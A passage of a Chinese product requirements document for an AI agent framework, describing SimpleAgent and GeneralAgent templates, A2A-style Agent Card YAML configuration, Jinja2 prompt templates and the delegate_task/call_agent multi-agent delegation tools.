
**核心价值主张**

提供开箱即用的 Agent 模板，让开发者无需从零搭建 AI 应用，通过配置即可快速创建符合特定场景的 AI Agent。框架提供两种模板满足不同复杂度需求：轻量级的 SimpleAgent 和功能完整的 GeneralAgent。

**目标用户**
- **主要用户**：桌面应用开发者，需要快速集成 AI 能力到应用中
- **次要用户**：AI 研究者，需要基础框架进行实验和扩展

**两种模板定位**

| 维度 | SimpleAgent（极简） | GeneralAgent（标准） |
|------|-------------------|---------------------|
| **复杂度** | 低（单次调用） | 高（多轮对话） |
| **状态管理** | 无状态 | 有状态（会话持久化） |
| **循环执行** | 不支持（单次推理） | 支持（ReAct Loop） |
| **技能系统** | 不支持 | 支持（@mention） |
| **HITL 审批** | 不支持 | 支持（工具审批） |
| **工作区隔离** | 不支持 | 支持（独立工作区） |
| **启动开销** | 低（<100ms） | 中（<500ms） |
| **适用场景** | 快速分析、代码审查、单轮任务 | 复杂研究、文档处理、多步骤任务 |

---

### 二、核心场景与用户故事

#### 场景 1：快速代码审查（SimpleAgent）

**用户角色**：开发者小李，提交代码前需要快速检查安全问题

**痛点**：
- GeneralAgent 太重（需要初始化会话、工作区）
- 只需要一次性分析，不需要多轮对话
- 希望立即得到结果（<5 秒）

**使用本框架的体验**：

```
步骤 1：调用 SimpleAgent
用户> @simple 审查 uploads/api.py 的安全问题

步骤 2：系统识别 @simple 并调用 SimpleAgent
系统>  [创建 SimpleAgent 实例]
       [加载代码审查模板]
       [使用 reasoning 模型进行分析]

步骤 3：SimpleAgent 单次分析
SimpleAgent> [读取文件内容]
            [分析代码：SQL 注入、XSS、硬编码密钥]

            ✅ 安全审查完成（耗时 3 秒）：

            发现 3 个问题：
            1. SQL 注入风险 (line 45): 未使用参数化查询
            2. XSS 风险 (line 78): 未转义用户输入
            3. 硬编码密钥 (line 102): API_KEY 暴露在代码中

            建议修复方案：...

步骤 4：任务结束（无会话保留）
```

**价值体现**：
- ✅ 响应速度：3 秒（vs GeneralAgent 10 秒+）
- ✅ 资源占用：低（无会话持久化、工作区创建）
- ✅ 适合高频调用：代码审查、快速问答

---

#### 场景 2：复杂文档分析（GeneralAgent）

**用户角色**：研究员王明，需要分析 80 页的研究报告 PDF

**痛点**：
- SimpleAgent 无法处理多步骤任务（提取表格、总结章节、生成摘要）
- 需要使用技能包（@pdf）处理 PDF
- 需要多轮对话确认细节

**使用本框架的体验**：

```
步骤 1：上传文件并提出需求
用户上传：research_report.pdf (80页)
系统> [自动加载 @pdf 技能]
      [创建会话工作区]

用户> 分析这份研究报告，提取所有数据表格并生成摘要

步骤 2：GeneralAgent 多步骤执行
GeneralAgent> [Loop 1] 阅读 PDF 技能文档
             [Loop 2] 提取文本内容（前 10 页预览）
             [Loop 3] 调用 search_file 搜索 "表格"
             [Loop 4] 提取 15 个表格数据
             [Loop 5] 生成章节摘要
             [Loop 6] 汇总最终报告

步骤 3：用户追问细节
用户> 第 3 个表格的数据有没有异常值？

GeneralAgent> [Loop 7] 读取第 3 个表格数据
             [Loop 8] 统计分析

             发现 2 个异常值：...

步骤 4：会话保存
系统> [保存会话到 data/sessions.db]
      [保留工作区 data/workspace/session-001/]

用户下次可以继续对话：/load session-001
```

**价值体现**：
- ✅ 复杂任务处理：多步骤自动推理（6-8 次循环）
- ✅ 技能支持：使用 @pdf 技能处理文档
- ✅ 会话持久化：可以中断后继续
- ✅ 上下文维护：记住之前的分析结果

---

#### 场景 3：批量调用 SimpleAgent（GeneralAgent 委派）

**用户角色**：项目经理张华，需要审查 20 个代码文件

**需求**：希望并行审查多个文件，但每个文件的审查是独立的（不需要会话状态）

**使用本框架的体验**：

```
用户> 审查 src/ 目录下所有 Python 文件的代码质量

GeneralAgent> [Loop 1] 使用 find_files 查找所有 .py 文件
             [发现 20 个文件]

             [Loop 2] 决定使用 delegate_task 并行处理

             [调用 delegate_task 工具 20 次（并行）]
             每次调用创建一个 SimpleAgent 实例：
             - delegate_task("审查 src/file1.py 的代码质量")
             - delegate_task("审查 src/file2.py 的代码质量")
             - ...

             [Loop 3] 汇总 20 个审查结果

             ✅ 代码质量审查完成（20 个文件，耗时 15 秒）

             总结：
             - 5 个文件有安全问题
             - 8 个文件需要优化性能
             - 7 个文件符合规范
```

**价值体现**：
- ✅ 并行处理：20 个文件同时审查
- ✅ 轻量委派：每个子任务用 SimpleAgent（快速）
- ✅ 结果汇总：GeneralAgent 负责整体协调

---

### 三、功能需求清单

#### 3.1 Agent Card 标准

**需求 1：Agent Card 元数据规范**

**需求描述**：
定义基于 A2A Protocol 的 Agent Card 标准，用于描述 Agent 的身份、能力、技能等元数据。

**Agent Card 结构**：

```yaml
<agent_id>:
  # ========== Identity (身份信息) ==========
  name: <Agent 显示名称>
  description: <一句话功能描述>
  provider: <local/remote>  # 本地 or 远程
  version: <版本号>

  # ========== Service Endpoint (服务端点) ==========
  factory_path: <工厂函数路径>  # provider=local 时使用
  # 例如: "simpleAgent.simple_agent:SimpleAgent"

  # ========== Capabilities (能力特性) ==========
  capabilities:
    - name: <能力名称>
      description: <能力描述>
    # 示例：stateless、fast、single_turn、template_support

  # ========== Skills (技能清单) ⭐ 核心 ==========
  skills:
    - name: <技能名称>
      description: <技能描述>
      input_mode: <text/json/structured/multimodal>
      output_mode: <text/json/markdown/stream>
      examples:
        - <使用示例 1>
        - <使用示例 2>
      parameters:
        <参数名>: <参数描述>

  # ========== Metadata (元数据) ==========
  tags: [<标签列表>]
  enabled: <true/false>
  always_available: <true/false>
  available_to_subagent: <true/false>
```

**字段说明**：

| 字段 | 必需 | 说明 | 示例 |
|------|------|------|------|
| **Identity** | | | |
| name | 是 | Agent 显示名称 | "SimpleAgent" |
| description | 是 | 功能简述（一句话） | "轻量级 Agent，快速执行简单任务" |
| provider | 是 | 提供者类型 | "local" / "remote" |
| version | 是 | 版本号 | "1.0.0" |
| **Service Endpoint** | | | |
| factory_path | 是* | 工厂函数路径（local agent） | "simpleAgent.simple_agent:SimpleAgent" |
| endpoint | 是* | HTTP endpoint（remote agent） | "http://api.example.com/agent" |
| **Capabilities** | | | |
| capabilities | 否 | 能力特性列表 | stateless、fast、multi_turn |
| **Skills** | | | |
| skills | 是 | 技能清单（核心） | 见下方 |
| **Metadata** | | | |
| tags | 否 | 标签列表 | ["lightweight", "stateless"] |
| enabled | 否 | 是否启用 | true |
| available_to_subagent | 否 | 子 Agent 是否可调用 | true |

**Skills 字段详解**：

| 字段 | 必需 | 说明 | 示例 |
|------|------|------|------|
| name | 是 | 技能唯一标识 | "quick_analysis" |
| description | 是 | 技能功能描述 | "快速分析单个文件（<100 行代码）" |
| input_mode | 是 | 输入模式 | text / json / multimodal |
| output_mode | 是 | 输出模式 | text / json / markdown / stream |
| examples | 是 | 使用示例（3-5 个） | "分析 uploads/script.py 的复杂度" |
| parameters | 否 | 参数说明 | `file_path`: "要分析的文件路径" |

**验收标准**：
- ✅ Agent Card 符合 A2A Protocol 标准
- ✅ Skills 清单完整，包含 3-5 个示例
- ✅ Capabilities 准确描述 Agent 特性
- ✅ factory_path 或 endpoint 必须提供一个

**实现参考**：`generalAgent/agents/schema.py`、`generalAgent/config/agents.yaml`

---

**需求 2：SimpleAgent 配置**

**需求描述**：
SimpleAgent 的 Agent Card 配置，定义其身份、能力和技能。

**配置示例**：

```yaml
simple:
  # Identity
  name: "SimpleAgent"
  description: "轻量级 Agent，适合快速执行简单任务（无状态，单次调用）"
  provider: "local"
  version: "1.0.0"

  # Service Endpoint
  factory_path: "simpleAgent.simple_agent:SimpleAgent"

  # Capabilities
  capabilities:
    - name: "stateless"
      description: "无状态，不保留会话历史"
    - name: "fast"
      description: "快速响应，无需初始化开销"
    - name: "single_turn"
      description: "单轮对话，一次性完成任务"
    - name: "template_support"
      description: "支持自定义 Prompt 模板"

  # Skills
  skills:
    - name: "quick_analysis"
      description: "快速分析单个文件（<100 行代码）或小型文档"
      input_mode: "text"
      output_mode: "markdown"
      examples:
        - "分析 uploads/script.py 的复杂度"
        - "审查 uploads/config.json 的语法错误"
        - "检查 uploads/data.csv 的数据质量"
      parameters:
        file_path: "要分析的文件路径"
        template: "（可选）自定义分析模板"

    - name: "reasoning_task"
      description: "使用推理模型解决数学/逻辑问题"
      input_mode: "text"
      output_mode: "text"
      examples:
        - "计算 fibonacci(100)"
        - "解决8皇后问题"
      parameters:
        task: "数学或逻辑问题描述"
        model_type: "（可选）指定模型类型，默认 reasoning"

    - name: "code_review"
      description: "快速代码审查（语法、风格、安全问题）"
      input_mode: "text"
      output_mode: "markdown"
      examples:
        - "审查 uploads/api.py 的安全问题"
        - "检查 uploads/component.tsx 的 React 最佳实践"
      parameters:
        file_path: "代码文件路径"
        focus: "（可选）审查重点，如 security, style, performance"

  # Metadata
  tags: ["lightweight", "stateless", "single-turn", "fast"]
  enabled: true
  always_available: false
  available_to_subagent: true
```

**验收标准**：
- ✅ 包含 3-5 个核心技能
- ✅ 每个技能有 2-3 个示例
- ✅ Capabilities 准确反映 SimpleAgent 特性（stateless、fast）
- ✅ available_to_subagent: true（GeneralAgent 可调用）

**实现参考**：`generalAgent/config/agents.yaml`、`simpleAgent/simple_agent.py`

---

**需求 3：GeneralAgent 配置**

**需求描述**：
GeneralAgent 的 Agent Card 配置，定义其身份、能力和技能。

**配置示例**：

```yaml
general:
  # Identity
  name: "GeneralAgent"
  description: "完整功能的 Agent，支持技能、多轮对话、会话持久化（有状态）"
  provider: "local"
  version: "1.0.0"

  # Service Endpoint
  factory_path: "generalAgent.runtime.app:build_application"

  # Capabilities
  capabilities:
    - name: "stateful"
      description: "有状态，保留完整会话历史"
    - name: "multi_turn"
      description: "支持多轮对话和复杂推理"
    - name: "skill_system"
      description: "支持加载和使用技能包（@mention skills）"
    - name: "hitl"
      description: "支持人机交互审批（Human-in-the-Loop）"
    - name: "persistence"
      description: "支持会话持久化（SQLite）"
    - name: "workspace"
      description: "独立的工作空间隔离"

  # Skills
  skills:
    - name: "complex_document_analysis"
      description: "分析大型文档（>10 页 PDF/DOCX/XLSX/PPTX）"
      input_mode: "text"
      output_mode: "markdown"
      examples:
        - "分析 uploads/report.pdf（80页），提取所有表格数据"
        - "总结 uploads/research.docx（50页）的研究结论"
        - "分析 uploads/data.xlsx（20个工作表）的财务指标"
      parameters:
        file_path: "文档路径"
        task: "分析任务描述"

    - name: "skill_based_task"
      description: "需要使用技能包的任务（如 @pdf, @docx 技能）"
      input_mode: "text"
      output_mode: "text"
      examples:
        - "使用 @pdf 技能填写 uploads/form.pdf 表单"
        - "使用 @docx 技能修改 uploads/contract.docx 中的合同条款"
      parameters:
        skill: "技能包名称（如 pdf, docx）"
        task: "任务描述"

    - name: "multi_step_research"
      description: "多步骤研究任务（需要多轮工具调用）"
      input_mode: "text"
      output_mode: "markdown"
      examples:
        - "研究 Python 3.13 的新特性，并生成对比报告"
        - "分析竞品的定价策略，生成市场分析报告"
      parameters:
        topic: "研究主题"
        output_format: "输出格式（如 markdown 表格、JSON）"

  # Metadata
  tags: ["full-featured", "stateful", "multi-turn", "complex"]
  enabled: false  # 默认不启用（GeneralAgent 是主 Agent）
  always_available: false
  available_to_subagent: false  # 防止无限递归
```

**验收标准**：
- ✅ 包含 3-5 个核心技能
- ✅ Skills 覆盖复杂任务场景（多步骤、技能使用、文档处理）
- ✅ Capabilities 包含 stateful、multi_turn、skill_system
- ✅ available_to_subagent: false（防止自我调用）

**实现参考**：`generalAgent/config/agents.yaml`、`generalAgent/runtime/app.py`

---

#### 3.2 SimpleAgent 模板

**需求 4：SimpleAgent 核心功能**

**需求描述**：
提供轻量级、无状态的 Agent 模板，支持单次推理、自定义模板、工具定制。

**核心特性**：

| 特性 | 说明 | 实现方式 |
|------|------|----------|
| 无状态 | 不保存会话历史 | 无 Session Store |
| 单次推理 | 一次 LLM 调用完成 | 无 ReAct Loop |
| 自定义模板 | 支持 Jinja2 模板 | PromptBuilder |
| 工具定制 | 可指定工具列表 | 动态加载工具 |
| 轻量启动 | <100ms | 无工作区、无会话初始化 |

**调用接口**：

```python
# 方式 1: 代码调用
agent = SimpleAgent()
result = await agent.run(
    template="你是 {role}。任务: {task}",
    params={"role": "分析师", "task": "分析数据"},
    tools=["read_file", "write_file"],
    model_type="reasoning"  # base/reasoning/vision/code/chat
)

# 方式 2: 使用预定义模板
agent = SimpleAgent(template_path="templates/code_reviewer.jinja2")
result = await agent.run(
    params={"file_path": "uploads/api.py"},
    user_message="审查这个文件的安全问题"
)

# 方式 3: 通过 GeneralAgent 调用（delegate_task）
# GeneralAgent 会自动创建 SimpleAgent 实例并调用
delegate_task("审查 uploads/api.py 的代码质量")
```

**Graph 结构**（极简）：

```
START → agent_node → finalize_node → END
```

无循环、无路由、单次执行。

**验收标准**：
- ✅ 单次推理延迟 <3s（含 LLM 调用）
- ✅ 启动开销 <100ms
- ✅ 支持 5 种模型类型（base/reasoning/vision/code/chat）
- ✅ 支持动态工具加载
- ✅ 支持 Jinja2 模板

**实现参考**：`simpleAgent/simple_agent.py`、`simpleAgent/graph/builder.py`

---

**需求 5：SimpleAgent 模板系统**

**需求描述**：
支持 Jinja2 模板语法，允许开发者自定义 Prompt 模板。

**模板格式**：

```jinja2
你是一个 {{ role }}。

你的任务：{{ task }}

{% if context %}
上下文信息：
{{ context }}
{% endif %}

请按照以下要求完成任务：
{% for requirement in requirements %}
- {{ requirement }}
{% endfor %}

{% if output_format %}
输出格式：{{ output_format }}
{% endif %}
```

**使用方式**：

```python
# 方式 1: 内联模板
agent = SimpleAgent()
result = await agent.run(
    template="你是 {role}。任务: {task}",
    params={"role": "数据分析师", "task": "分析销售数据"}
)

# 方式 2: 模板文件
agent = SimpleAgent(template_path="templates/analyst.jinja2")
result = await agent.run(
    params={
        "role": "财务分析师",
        "task": "生成季度报告",
        "requirements": ["包含图表", "总结趋势"],
        "output_format": "Markdown"
    }
)
```

**内置模板示例**：

| 模板 | 路径 | 用途 |
|------|------|------|
| 代码审查 | `templates/code_reviewer.jinja2` | 审查代码安全、风格、性能 |
| 数据分析 | `templates/data_analyst.jinja2` | 分析数据并生成报告 |
| 文档总结 | `templates/summarizer.jinja2` | 总结长文档 |

**验收标准**：
- ✅ 支持 Jinja2 完整语法（变量、条件、循环）
- ✅ 支持内联模板和文件模板
- ✅ 模板渲染错误时返回清晰提示
- ✅ 提供 3-5 个内置模板

**实现参考**：`simpleAgent/utils/prompt_builder.py`

---

#### 3.3 GeneralAgent 模板

**需求 6：GeneralAgent 核心功能**

**需求描述**：
提供功能完整的 Agent 模板，支持多轮对话、技能系统、HITL 审批、会话持久化。

**核心特性**：

| 特性 | 说明 | 实现方式 |
|------|------|----------|
| 有状态 | 保留完整会话历史 | SessionStore（SQLite） |
| ReAct Loop | 多轮推理执行 | LangGraph 循环 |
| 技能系统 | 支持 @mention 加载技能 | SkillRegistry |
| 工具系统 | 支持 @mention 加载工具 | ToolRegistry |
| HITL 审批 | 高风险操作需审批 | ApprovalChecker |
| 工作区隔离 | 每个会话独立目录 | WorkspaceManager |
| 上下文管理 | 自动压缩长对话 | ContextCompressor |

---

**需求 7：GeneralAgent 模板系统**

**需求描述**：
支持 Jinja2 模板语法，允许开发者自定义 Prompt 模板。与 SimpleAgent 类似，GeneralAgent 也采用模板化设计，便于定制和维护。

**模板架构**：

```
generalAgent/config/prompt_templates/
├── charlie_identity.jinja2    # Charlie 基础身份（共享）
├── planner.jinja2             # Planner 节点系统提示
├── subagent.jinja2            # Subagent 系统提示
└── finalize.jinja2            # Finalize 节点系统提示
```

**模板加载方式**：

```python
# 方式 1: 使用默认模板（推荐）
from generalAgent.graph.prompts import PLANNER_SYSTEM_PROMPT

# 系统自动从模板加载
system_prompt = PLANNER_SYSTEM_PROMPT

# 方式 2: 自定义模板参数
from generalAgent.utils.prompt_builder import PromptBuilder

# 自定义 Planner 提示
custom_planner = PromptBuilder.load_planner_prompt(
    extra_instructions="额外工作要求...",
    custom_context="自定义上下文..."
)

# 方式 3: 完全自定义模板
custom_prompt = PromptBuilder.load_custom_prompt(
    template_path="my_templates/custom_planner.jinja2",
    role="专业顾问",
    domain="金融分析"
)
```

**内置模板示例**：

**1. charlie_identity.jinja2** - Charlie 基础身份
```jinja2
你是 Charlie，一个高效、友好的 AI 助手。

核心能力：
- 调用工具完成任务
- 委派子任务给专用 agent
- 拆解复杂任务为可执行步骤

回复原则：
- 简洁直接，中文为主，技术术语保留英文
- 不编造信息，不假设用户意图
- 遇到不确定信息时主动询问
```

**2. planner.jinja2** - Planner 节点提示
```jinja2
{{ charlie_identity }}

# 工作方式
你以自主循环方式工作：分析请求 → 调用工具 → 检查完成度 → 继续或停止

## 工具使用场景

### 任务追踪
多步骤任务（3+ 步骤）使用 **todo_write/todo_read** 追踪进度。

### 任务委派
- **delegate_task**: 将独立子任务委派给专用 agent
  - 何时委派：复杂子任务、批量操作、试错任务
  - 何时不委派：简单查询、当前任务的下一步骤

### 文件操作
- **新文件**：write_file 创建
- **修改文件**：**优先 edit_file**（old_string → new_string）
```

**3. subagent.jinja2** - Subagent 提示
```jinja2
你是任务执行器（Subagent），负责完成主 Agent 委托的具体任务。

⚠️ **重要：你在独立上下文中运行**
- **主 Agent 看不到你的对话历史，只能看到你的最后一条消息**
- 因此你必须在最后消息中提供完整摘要

核心原则：
- 目标导向：只完成任务描述中的具体目标
- 直接执行：收到任务后立即使用工具完成
- 完整摘要：最后消息必须包含执行过程和结果
```

**模板参数支持**：

GeneralAgent 模板支持动态参数注入：

```python
# 加载 Planner 提示并注入自定义参数
planner_prompt = PromptBuilder.load_planner_prompt(
    # 自定义参数
    extra_tools_guidance="使用 @fetch_web 获取最新信息",
    domain_knowledge="你精通金融投资领域",
    output_requirements="所有分析必须包含数据来源"
)
```

**模板系统优势**：

| 优势 | 说明 |
|------|------|
| **可维护性** | Prompt 集中管理，修改无需改代码 |
| **可定制性** | 支持 Jinja2 完整语法（变量、条件、循环） |
| **一致性** | 多个节点共享基础身份（charlie_identity） |
| **安全性** | 使用 SandboxedEnvironment 防止代码注入 |
| **版本控制** | 模板文件可纳入 Git 管理 |

**验收标准**：
- ✅ 支持 Jinja2 完整语法
- ✅ 支持参数化模板加载
- ✅ 支持自定义模板路径
- ✅ 模板渲染错误时返回清晰提示
- ✅ 与现有代码向后兼容

**实现参考**：
- `generalAgent/utils/prompt_builder.py` - 模板加载器
- `generalAgent/config/prompt_templates/` - 模板文件目录
- `generalAgent/graph/prompts.py` - 默认 Prompt 加载

**Graph 结构**（ReAct Loop）：

```
START → planner_node → tools_node → planner_node → ... → finalize_node → END
                ↓                       ↑
              (tool_calls?)              |
                ↓                       |
            summarization_node          |
                (if context full)        |
                ↓_____________________|
```

**验收标准**：
- ✅ 支持至少 100 轮对话
- ✅ 支持 ReAct Loop（最大循环 100 次，可配置）
- ✅ 支持技能和工具按需加载
- ✅ 支持会话持久化和恢复
- ✅ 支持上下文自动压缩（>95% token 使用率时）

**实现参考**：`generalAgent/runtime/app.py`、`generalAgent/graph/builder.py`

---

**需求 7：Agent 调用机制（call_agent）**

**需求描述**：
GeneralAgent 可以通过 `call_agent` 工具调用其他 Agent（如 @simple）。

**调用流程**：

```
1. 用户输入包含 @simple
   ↓
2. 系统识别 @mention → 生成 transfer_to_simple 工具
   ↓
3. GeneralAgent 决策调用 transfer_to_simple(task=...)
   ↓
4. 系统创建 SimpleAgent 实例
   ├─ 继承工具（available_to_subagent: true 的工具）
   ├─ 继承工作区路径
   └─ 不继承会话历史（SimpleAgent 无状态）
   ↓
5. SimpleAgent 执行任务
   ↓
6. 返回结果给 GeneralAgent
   ↓
7. GeneralAgent 继续对话
```

**工具自动生成**：

```python
# 当用户 @simple 时，系统自动生成此工具：
@tool
def transfer_to_simple(task: str) -> str:
    """调用 SimpleAgent 执行快速任务

    Args:
        task: 任务描述

    Returns:
        SimpleAgent 的执行结果
    """
    # 内部实现：创建 SimpleAgent 并调用
    agent = SimpleAgent()
    result = await agent.run(user_message=task)
    return result
```

**验收标准**：
- ✅ 支持通过 @mention 调用 Agent
- ✅ 工具自动生成（transfer_to_{agent_id}）
- ✅ 子 Agent 继承工具和工作区
- ✅ 子 Agent 执行结果正确返回

**实现参考**：`generalAgent/agents/handoff_tools.py`、`generalAgent/tools/builtin/call_agent.py`

---

### 四、参考代码位置

| 功能模块 | 代码路径 |
|---------|---------|
| Agent Card Schema | `generalAgent/agents/schema.py` |
| Agent 配置文件 | `generalAgent/config/agents.yaml` |
| Agent 注册表 | `generalAgent/agents/registry.py` |
| Agent 工厂 | `generalAgent/agents/factory.py` |
| Handoff 工具生成 | `generalAgent/agents/handoff_tools.py` |
| SimpleAgent 实现 | `simpleAgent/simple_agent.py` |
| SimpleAgent Graph | `simpleAgent/graph/builder.py` |
| SimpleAgent 模板 | `simpleAgent/utils/prompt_builder.py` |
| GeneralAgent 应用 | `generalAgent/runtime/app.py` |
| GeneralAgent Graph | `generalAgent/graph/builder.py` |
| call_agent 工具 | `generalAgent/tools/builtin/call_agent.py` |
| delegate_task 工具 | `generalAgent/tools/builtin/delegate_task.py` |

---

# 8. 多Agent协作

### 产品定位

多Agent协作是框架的任务分发层,支持主Agent将复杂任务委派给专用子Agent或不同类型的Agent执行。通过`delegate_task`(同类型副本)和`call_agent`(不同类型Agent)两种机制,实现任务隔离、上下文继承、结果聚合的完整协作流程。

**价值主张**:
- **任务隔离**:Subagent独立上下文,避免污染主对话历史(100+轮对话场景)
- **能力复用**:继承主Agent的工具、技能、工作区,无需重复配置
- **类型切换**:根据任务特征选择SimpleAgent(快速)或GeneralAgent(复杂)
- **透明协作**:Subagent执行对用户可见,支持实时流式输出

**两种协作机制对比**:

| 维度 | delegate_task | call_agent |
|------|---------------|------------|
| **调用对象** | 调用自身副本(同类型) | 调用其他类型Agent |
| **使用场景** | 深度研究、批量处理、反复调试 | 快速分析、不同能力 |
| **上下文** | 独立(继承工具/技能/工作区) | 独立(可选继承) |
| **状态管理** | 有状态(GeneralAgent) | 无状态(SimpleAgent)或有状态 |
| **实现方式** | LangGraph子图执行 | 直接调用Agent工厂 |
| **返回结果** | JSON(ok, result, loops) | Command对象(更新父状态) |

---

### 核心场景

#### 场景 1:深度研究任务(delegate_task)

**用户故事**:
用户询问"Python 3.13有哪些新特性?",主Agent需要执行多次搜索、文档阅读、对比分析。

**系统行为**:
1. 主Agent检测到需要多轮迭代的研究任务
2. 调用`delegate_task("搜索并总结Python 3.13新特性...")`
3. 创建subagent独立上下文(context_id: subagent-abc123)
4. Subagent继承:
   - 主Agent的@mentioned工具(如fetch_web)
   - 主Agent的工作区路径
   - 主Agent的技能
5. Subagent执行:
   - Loop 1: 搜索Python 3.13官方文档
   - Loop 2: 提取关键特性列表
   - Loop 3: 搜索社区反馈
   - Loop 4: 对比3.12差异
   - Loop 5: 生成总结报告
6. 返回结果给主Agent
7. 主Agent将结果整合到回复中

**关键点**:
- Subagent执行10+轮loop,但不污染主对话
- 继承工具(fetch_web)无需重新@mention
- 实时流式输出(用户可见subagent进度)

---

#### 场景 2:快速代码审查(call_agent)

**用户故事**:
用户要求"分析uploads/script.py的复杂度",主Agent(GeneralAgent)决定使用轻量级SimpleAgent快速完成。

**系统行为**:
1. 主Agent检测到简单分析任务
2. 调用`call_agent(agent_id="simple", task="分析script.py复杂度...")`
3. 系统加载SimpleAgent:
   - 无状态,单次推理
   - 启动时间<100ms
4. SimpleAgent执行:
   - 读取文件内容
   - 使用reasoning模型分析
   - 返回复杂度评估
5. 返回Command对象更新主Agent状态
6. 主Agent接收结果并回复用户

**关键点**:
- SimpleAgent响应速度快(3秒 vs GeneralAgent 10秒+)
- 无需创建会话和工作区
- 适合高频调用场景

---

#### 场景 3:批量文件处理(delegate_task)

**用户故事**:
用户要求"分析uploads/目录下所有Python文件,找出使用deprecated API的地方"

**系统行为**:
1. 主Agent扫描目录,发现50个Python文件
2. 调用`delegate_task("扫描50个文件,记录deprecated API使用...")`
3. Subagent继承主Agent的工作区
4. Subagent执行:
   - Loop 1-50: 逐个读取文件
   - Loop 51-100: 搜索deprecated关键字
   - Loop 101: 生成Markdown表格汇总
5. 返回结果:[文件路径 | 行号 | API名称 | 建议替换]
6. 主Agent展示表格给用户

**关键点**:
- 100+次工具调用不污染主对话
- Subagent可以访问相同工作区
- 结果格式化由subagent完成

---

### 功能需求

#### 需求 1:delegate_task工具(同类型副本)

**功能描述**:
将复杂子任务委派给独立的subagent执行,适合需要多轮迭代、大量中间结果的任务。

**工具签名**:
```python
@tool
async def delegate_task(
    task: str,
    max_loops: int = 50,
    config: Annotated[dict, InjectedToolArg] = None,
) -> str:
    """委派独立子任务给专用子agent执行"""
```

**参数说明**:
- `task`: 自包含的任务描述(必须包含:目标、上下文、期望格式)
- `max_loops`: 子agent最大循环次数(默认50)
- `config`: 注入的配置(由LangGraph自动提供)

**执行流程**:
1. 生成唯一context_id: `subagent-{uuid[:8]}`
2. 从parent_state_store获取父状态
3. 继承父Agent状态:
   - `mentioned_agents`: 继承@mentioned工具列表
   - `active_skill`: 继承当前激活技能
   - `workspace_path`: 继承工作区路径
   - `uploaded_files`: 继承已上传文件列表
4. 创建独立delegated_state:
   - `messages`: [HumanMessage(task)]
   - `context_id`: subagent-xxx
   - `parent_context`: 父Agent的context_id
5. 调用app_graph.astream()执行subagent
6. 实时打印subagent输出(流式)
7. 提取最后一条AIMessage作为结果
8. 返回JSON:
   ```json
   {
       "ok": true,
       "result": "任务执行结果...",
       "loops": 15,
       "context_id": "subagent-abc123"
   }
   ```

**继承规则**:
- ✅ 继承:`mentioned_agents`, `active_skill`, `workspace_path`, `uploaded_files`
- ❌ 不继承:`messages`(独立对话历史), `todos`(独立任务列表)

**验收标准**:
- ✅ Subagent看不到主对话历史(独立上下文)
- ✅ Subagent可以使用主Agent @mentioned的工具
- ✅ Subagent可以访问主Agent的工作区文件
- ✅ 支持实时流式输出(用户可见进度)
- ✅ 返回JSON包含ok/result/loops字段

**参考代码位置**:
- `generalAgent/tools/builtin/delegate_task.py:38-200` - delegate_task实现
- `generalAgent/graph/nodes/planner.py:360-376` - 父状态存储
- `generalAgent/tools/builtin/delegate_task.py:29-35` - set_parent_state()

---

#### 需求 2:call_agent工具(跨类型调用)

**功能描述**:
调用其他类型Agent执行任务,基于Agent Card标准(A2A Protocol)实现能力发现和调用。

**工具签名**:
```python
@tool
async def call_agent(
    agent_id: str,
    task: str,
    max_loops: Optional[int] = None,
    template: Optional[str] = None,
    tools: Optional[list[str]] = None,
    model_type: Optional[str] = None,
    state: Annotated[dict, InjectedState] = None,
    tool_call_id: Annotated[str, InjectedToolCallId] = None,
) -> Command:
    """调用其他agent执行任务"""
```

**参数说明**:
- `agent_id`: Agent ID(如"simple", "general")
- `task`: 任务描述(必须详细,目标agent无法访问调用者历史)
- `max_loops`: 最大循环次数(仅对GeneralAgent有效)
- `template`: Prompt模板(仅对SimpleAgent有效)
- `tools`: 工具列表(仅对SimpleAgent有效)
- `model_type`: 模型类型(base/reasoning/code等)

**支持的Agent类型**:

**SimpleAgent** (`agent_id="simple"`):
- 特点:无状态、单次调用、快速响应
- Skills:
  - `quick_analysis`: 快速分析单个文件(<100行代码)
  - `reasoning_task`: 使用推理模型解决数学/逻辑问题
  - `code_review`: 快速代码审查(语法/风格/安全)
- 配置:`enabled: true`, `available_to_subagent: true`

**GeneralAgent** (`agent_id="general"`):
- 特点:有状态、多轮对话、技能系统
- Skills:
  - `complex_document_analysis`: 分析大型文档(>10页PDF/DOCX)
  - `skill_based_task`: 使用技能包的任务(@pdf/@docx等)
  - `multi_step_research`: 多步骤研究任务
- 配置:`enabled: false`, `available_to_subagent: false`(防止无限递归)

**执行流程**:
1. 检查agent_registry是否初始化
2. 验证agent_id是否存在
3. 检查agent是否enabled或通过@mention激活
4. 根据agent类型调用对应工厂:
   - SimpleAgent: 调用`SimpleAgent.execute()`
   - GeneralAgent: 调用`build_application()`并执行
5. 返回Command对象:
   ```python
   Command(
       update={
           "messages": [ToolMessage(content=result, tool_call_id=tool_call_id)]
       }
   )
   ```

**与delegate_task的区别**:
- `delegate_task`: 调用自身副本,继承状态,适合深度迭代
- `call_agent`: 调用不同类型Agent,能力切换,适合快速任务

**验收标准**:
- ✅ 支持调用SimpleAgent和GeneralAgent
- ✅ Agent不存在时返回清晰错误提示
- ✅ 支持SimpleAgent的template/tools参数
- ✅ 返回Command对象更新父状态
- ✅ 支持@mention动态加载agent

**参考代码位置**:
- `generalAgent/tools/builtin/call_agent.py:38-200` - call_agent实现
- `generalAgent/agents/registry.py` - AgentRegistry
- `generalAgent/agents/handoff_tools.py` - transfer_to_{agent_id}自动生成
- `generalAgent/config/agents.yaml` - Agent配置

---

#### 需求 3:Agent Card标准(A2A Protocol)

**功能描述**:
基于A2A Protocol定义Agent元数据标准,支持能力发现、技能查询、自动文档生成。

**Agent Card结构**:
```python
@dataclass
class AgentCard:
    # Identity
    id: str                    # Agent唯一标识
    name: str                  # 显示名称
    description: str           # 简短描述
    provider: str              # 提供方(local/remote)
    version: str               # 版本号

    # Service Endpoint
    factory_path: str          # 工厂函数路径

    # Capabilities (能力特性)
    capabilities: List[Capability]
    # 示例: stateless, fast, single_turn, template_support

    # Skills (技能清单) ⭐ 核心部分
    skills: List[Skill]
    # 每个skill包含: name, description, input_mode, output_mode, examples, parameters

    # Metadata
    tags: List[str]            # 标签
    enabled: bool              # 是否启用
    always_available: bool     # 是否全局可用
    available_to_subagent: bool  # 子agent是否可调用
```

**Skill定义**:
```python
@dataclass
class Skill:
    name: str                  # 技能名称
    description: str           # 详细描述
    input_mode: str            # text | json | structured | multimodal
    output_mode: str           # text | json | markdown | stream
    examples: List[str]        # 使用示例
    parameters: Dict[str, str] # 参数说明
```

**配置示例**(agents.yaml):
```yaml
optional:
  simple:
